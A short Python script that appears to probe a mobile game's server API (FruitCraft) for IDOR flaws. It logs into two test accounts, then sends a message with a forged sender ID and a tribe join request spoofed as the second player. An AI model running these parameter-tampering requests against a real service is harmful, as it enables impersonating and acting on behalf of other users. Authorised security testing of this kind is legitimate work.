import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing Messages/Social IDOR...")
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    c2 = FruitClient()
    s2, d2 = c2.login(os.environ.get("TEST_ACC_2_KEY", "REDACTED_KEY_2"), os.environ.get("TEST_ACC_2_UDID", "REDACTED_UDID_2"))
    if not s2: return
    
    t1_id = d1["data"]["id"]
    t2_id = d2["data"]["id"]
    print(f"T1 ID: {t1_id}")
    print(f"T2 ID: {t2_id}")

    print("\n[+] Testing forging sender ID in message (T1 sending as T2)")
    # sendmessage.php handles messages
    # In older versions they might have accepted arbitrary sender id
    payload = {
        "text": "Forged Message",
        "receiver_id": t1_id,
        "sender_id": t2_id # Try to inject sender_id
    }
    res = c1.post("/sendmessage.php", payload)
    print("Forge Sender:", res)

    time.sleep(2)
    
    print("\n[+] Testing tribe join request spoofing (request to join as someone else)")
    # Assuming tribe 1234 exists
    payload = {"tribe_id": 1234, "player_id": t2_id}
    res2 = c1.post("/tribe/joinrequest", payload)
    print("Spoof Join:", res2)

if __name__ == "__main__":
    main()
